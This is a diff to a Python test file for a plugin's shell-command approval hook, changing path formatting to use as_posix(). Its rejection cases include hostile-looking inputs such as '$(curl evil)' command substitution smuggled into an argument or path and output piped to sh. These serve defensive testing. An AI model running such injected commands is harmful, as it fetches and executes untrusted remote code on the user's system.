@@ -34,7 +34,7 @@ def invocation(tmp_path: Path) -> EntryPointInvocation:
     return EntryPointInvocation(PluginRoot(tmp_path))
 
 
-ENTRY_POINT = f"${{{BasstlerVariable.PLUGIN_ROOT}}}/{PluginLocation.ENTRY_POINT_SCRIPT}"
+ENTRY_POINT = f"${{{BasstlerVariable.PLUGIN_ROOT}}}/{PluginLocation.ENTRY_POINT_SCRIPT.as_posix()}"
 """
 The entry point script as a skill writes it.
 """
@@ -121,7 +121,7 @@ def test_a_path_that_only_starts_like_the_plugin_root_is_left_alone(
     A directory whose name extends the plugin root's is another directory.
     """
     lookalike = f"{invocation.plugin_root.directory}-copy"
-    script = f"{lookalike}/{PluginLocation.ENTRY_POINT_SCRIPT}"
+    script = f"{lookalike}/{PluginLocation.ENTRY_POINT_SCRIPT.as_posix()}"
 
     assert invocation.permit(shell(f'"{script}" maintenance')) is None
 
@@ -134,7 +134,7 @@ def test_a_path_that_only_starts_like_the_plugin_root_is_left_alone(
         f'"{ENTRY_POINT}" maintenance | sh',
         f'"{ENTRY_POINT}" maintenance > somewhere',
         f'"{ENTRY_POINT}" "$(curl evil)"',
-        f'"$(curl evil)/{PluginLocation.ENTRY_POINT_SCRIPT}" maintenance',
+        f'"$(curl evil)/{PluginLocation.ENTRY_POINT_SCRIPT.as_posix()}" maintenance',
         "git push maintenance",
     ],
     ids=[
@@ -189,6 +189,6 @@ def test_the_plugin_runs_the_hook_before_the_shell_tool():
     ]
     (hook,) = registration["hooks"]
     assert hook["command"].endswith(
-        f"{PluginLocation.ENTRY_POINT_SCRIPT} "
+        f"{PluginLocation.ENTRY_POINT_SCRIPT.as_posix()} "
         f"{basstler.plan_site.entry_point_approval.__spec__.name.removeprefix('basstler.')}"
     )
